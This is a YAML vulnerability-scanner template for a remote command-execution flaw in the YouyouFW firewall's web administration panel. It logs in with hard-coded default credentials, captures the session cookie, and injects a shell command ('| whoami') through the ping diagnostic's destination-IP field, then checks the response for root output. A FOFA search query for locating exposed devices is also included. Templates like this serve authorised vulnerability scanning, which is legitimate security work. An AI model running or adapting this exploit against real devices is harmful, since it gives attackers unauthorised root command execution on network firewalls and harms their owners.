id: YouyouFW_RCE

info:
  name: 佑友防火墙 后台命令执行漏洞
  author: daffainfo
  severity: critical
  description: 佑友防火墙+路由，保障您的网络更安全更稳定。弥补传统路由器因内外人数增加带来的网络延迟和不稳定问题；防火墙模块具备了防黑功能，防止ARP等病毒骚扰；佑友防火墙网关同时还配备了上网行为管理模块，可以合理有效控制员工上网行为，大大降低了员工上网中病毒的概率，同时高效使用公司带宽，不会造成网络阻塞等状况。佑友防火墙系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。
  reference:
    - https://mp.weixin.qq.com/s/DE34Gu6Dw9hBbkdJqizSYQ
  metadata:
    fofa-query: title="佑友防火墙"
set:
  hosturl: request.url
rules:
    r0:
        request:
            method: POST
            path: /index.php?c=user&a=ajax_save
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: username=admin&password=hicomadmin&language=zh-cn
        expression: |
            response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"message":') && response.raw_header.bcontains(b'Set-Cookie')  && response.raw_header.bcontains(b'FWSESSID=')
        output:
            search: '"Set-Cookie: FWSESSID=(?P<fwsessid>.*?)\r\n".bsubmatch(response.raw_header)'
            fwsessid: search["fwsessid"]
    r1:
        request:
            method: POST
            path: /index.php?c=maintain&a=ping
            headers:
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
                Cookie: FWSESSID={{fwsessid}}; PHPSESSID={{fwsessid}}; lange=zh-cn
                Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
                Accept-Encoding: gzip, deflate
                Origin: "{{hosturl}}"
                Referer: "{{hosturl}}/index.php?c=maintain&a=ping"
                Upgrade-Insecure-Requests: 1
                Sec-Fetch-Dest: frame
                Sec-Fetch-Mode: navigate
                Sec-Fetch-Site: same-origin
                Sec-Fetch-User: ?1
                Te: trailers
            body: interface=&destip=+127.0.0.1+%7C+whoami
        expression: |
            response.status == 200 && response.body.bcontains(b'root</textarea>')
expression: r0() && r1()